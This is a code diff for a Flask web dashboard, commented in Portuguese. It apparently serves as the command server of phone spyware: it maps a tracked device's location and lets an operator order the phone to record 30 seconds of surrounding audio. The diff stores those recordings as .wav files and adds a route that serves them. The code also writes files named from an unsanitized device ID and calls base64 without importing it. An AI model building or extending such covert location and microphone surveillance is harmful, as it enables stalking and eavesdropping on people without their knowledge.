@@ -1,8 +1,13 @@
 import os
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, send_from_directory
 
 app = Flask(__name__)
 db_dispositivos = {}
+
+# Garante que a pasta temporária para salvar os arquivos de áudio físicos existe na Render
+AUDIO_DIR = "/tmp/nexos_audios"
+if not os.path.exists(AUDIO_DIR):
+    os.makedirs(AUDIO_DIR)
 
 HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 <html>
@@ -31,16 +36,10 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .map-container { width: 100%; height: 260px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
         .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 15px; }
-        
-        /* AUDIO CONTROLS CUSTOM */
         .audio-box { background: #070f15; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; text-align: center; }
         .btn-trigger-audio { background: #ea580c; color: #fff; font-weight: bold; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 12px; }
         .btn-trigger-audio:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
-        
-        .custom-controls { display: flex; gap: 10px; justify-content: center; margin-top: 10px; }
-        .btn-audio-control { background: #1e293b; border: 1px solid #38bdf8; color: #38bdf8; padding: 8px 16px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; text-transform: uppercase; }
-        .btn-audio-control:hover { background: #38bdf8; color: #070f15; }
-        audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); margin-top: 10px; }
+        audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); margin-top: 5px; }
     </style>
 </head>
 <body>
@@ -78,21 +77,15 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 
                 <div class="audio-box">
                     <button id="btn_audio" class="btn-trigger-audio" onclick="dispararGravacao()">🎙️ SOLICITAR ESCUTA DE 30S</button>
-                    
-                    <div class="custom-controls">
-                        <button class="btn-audio-control" onclick="forçarPlay()">▶ Ouvir Áudio</button>
-                        <button class="btn-audio-control" onclick="forçarPause()">⏸ Pausar</button>
-                    </div>
-                    
-                    <audio id="audio_player" controls preload="auto"></audio>
-                    <div id="audio_status" style="font-size:10px; color:#64748b; margin-top:5px;">Nenhum áudio carregado.</div>
+                    <audio id="audio_player" controls src="{{ '/get_audio/' + id_buscado if info_moto.has_audio else '' }}"></audio>
+                    <div id="audio_status" style="font-size:11px; color:#64748b; margin-top:5px;">Nenhuma escuta ativa no momento.</div>
                 </div>
             </div>
 
             <script>
                 let lat = {{ info_moto.lat }};
                 let lon = {{ info_moto.lon }};
-                let currentAudioB64 = "";
+                let lastAudioTimestamp = 0;
                 
                 const map = L.map('map_private', { zoomControl: false }).setView([lat, lon], 16);
                 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
@@ -101,26 +94,12 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 async function dispararGravacao() {
                     const btn = document.getElementById('btn_audio');
                     btn.disabled = true;
-                    btn.innerText = "⏳ Gravando no Celular... Aguarde 35s";
+                    btn.innerText = "⏳ Gravando áudio remoto... Aguarde 35s";
                     await fetch('/api/ordem_audio/{{ id_buscado }}', { method: 'POST' });
                     setTimeout(() => {
                         btn.innerText = "🎙️ SOLICITAR ESCUTA DE 30S";
                         btn.disabled = false;
                     }, 38000);
-                }
-
-                // Funções que forçam o player a rodar ignorando as travas do navegador
-                function forçarPlay() {
-                    const player = document.getElementById('audio_player');
-                    if(player.src) {
-                        player.play().catch(e => alert("Clique novamente para reproduzir"));
-                    } else {
-                        alert("Ainda não há áudio capturado. Clique em SOLICITAR ESCUTA primeiro.");
-                    }
-                }
-
-                function forçarPause() {
-                    document.getElementById('audio_player').get(0).pause();
                 }
 
                 setInterval(async () => {
@@ -137,13 +116,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             map.panTo(newPos);
                             document.getElementById('lnk_maps').href = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}`;
                             
-                            // Carrega o áudio e força o status a mudar
-                            if (data.audio_b64 && data.audio_b64 !== currentAudioB64) {
-                                currentAudioB64 = data.audio_b64;
+                            // Verifica o carimbo de tempo do áudio para atualizar o player sem dar conflito
+                            if (data.audio_timestamp && data.audio_timestamp !== lastAudioTimestamp) {
+                                lastAudioTimestamp = data.audio_timestamp;
                                 const player = document.getElementById('audio_player');
-                                player.src = "data:audio/wav;base64," + data.audio_b64;
+                                // Adiciona um parâmetro t para enganar o cache do navegador e forçar o recarregamento
+                                player.src = "/get_audio/{{ id_buscado }}?t=" + lastAudioTimestamp;
                                 player.load();
-                                document.getElementById('audio_status').innerText = "✅ NOVO ÁUDIO DISPONÍVEL! CLIQUE EM OUVIR ÁUDIO.";
+                                document.getElementById('audio_status').innerText = "✅ NOVA ESCUTA RECEBIDA! USE O PLAYER ACIMA.";
                                 document.getElementById('audio_status').style.color = "#34d399";
                             }
                         }
@@ -182,6 +162,14 @@ def ordem_audio(device_id):
         return jsonify({"status": "ordem_enviada"}), 200
     return jsonify({"status": "error"}), 404
 
+# ROTA ESTÁTICA: Serve o arquivo físico de áudio diretamente da memória do servidor
+@app.route('/get_audio/<device_id>')
+def get_audio(device_id):
+    filename = f"{device_id}.wav"
+    if os.path.exists(os.path.join(AUDIO_DIR, filename)):
+        return send_from_directory(AUDIO_DIR, filename, mimetype="audio/wav")
+    return "No audio", 404
+
 @app.route('/update', methods=['POST'])
 def update():
     global db_dispositivos
@@ -190,7 +178,7 @@ def update():
     device_id = data['device_id']
     
     if device_id not in db_dispositivos:
-        db_dispositivos[device_id] = {"audio_b64": "", "comando_gravacao": False}
+        db_dispositivos[device_id] = {"has_audio": False, "audio_timestamp": 0, "comando_gravacao": False}
         
     db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
     db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
@@ -198,8 +186,18 @@ def update():
     db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
     db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
     
+    # Se vier áudio, o servidor decodifica o Base64 e reconstrói o arquivo físico .wav real
     if data.get("audio_b64"):
-        db_dispositivos[device_id]["audio_b64"] = data.get("audio_b64")
+        import time
+        try:
+            audio_bytes = base64.b64decode(data.get("audio_b64"))
+            filepath = os.path.join(AUDIO_DIR, f"{device_id}.wav")
+            with open(filepath, "wb") as f:
+                f.write(audio_bytes)
+            db_dispositivos[device_id]["has_audio"] = True
+            db_dispositivos[device_id]["audio_timestamp"] = int(time.time())
+        except Exception as e:
+            print("Erro ao processar arquivo fisico de som:", e)
         
     checar_ordem = db_dispositivos[device_id].get("comando_gravacao", False)
     if checar_ordem:
